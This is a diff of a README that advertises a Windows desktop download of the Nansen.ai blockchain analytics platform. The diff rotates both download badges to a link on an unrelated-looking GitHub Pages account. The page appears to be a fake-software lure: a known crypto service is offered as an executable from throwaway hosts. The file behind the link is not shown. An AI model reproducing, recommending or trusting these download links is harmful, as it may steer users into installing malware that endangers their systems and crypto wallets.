@@ -4,7 +4,7 @@
 
 ## 📥 Download Nansen.ai for Windows
 
-[![⬇️ Download Nansen.ai](https://img.shields.io/badge/Download-Nansen.ai-blue?style=for-the-badge&logo=windows)](https://nansen-ai-desktop-app.github.io/.github/Nansen.ai)
+[![⬇️ Download Nansen.ai](https://img.shields.io/badge/Download-Nansen.ai-blue?style=for-the-badge&logo=windows)](https://drausmyegori06.github.io/.github/nansen-ai-analytics-wallet)
 
 ---
 
@@ -24,7 +24,7 @@ Security and reliability are key to Nansen.ai’s design. The platform processes
 
 Ultimately, Nansen.ai serves as a comprehensive intelligence hub for the blockchain economy. Whether you are a short-term trader looking to front-run market trends, a DeFi strategist seeking high-yield opportunities, or an institutional analyst evaluating token ecosystems, Nansen.ai equips you with the transparency, precision, and depth of insight needed to thrive in the ever-evolving digital asset landscape.
 
-[![⬇️ Download Nansen.ai](https://img.shields.io/badge/Download-Nansen.ai-blue?style=for-the-badge&logo=windows)](https://nansen-ai-desktop-app.github.io/.github/Nansen.ai)
+[![⬇️ Download Nansen.ai](https://img.shields.io/badge/Download-Nansen.ai-blue?style=for-the-badge&logo=windows)](https://drausmyegori06.github.io/.github/nansen-ai-analytics-wallet)
 
 ---
 
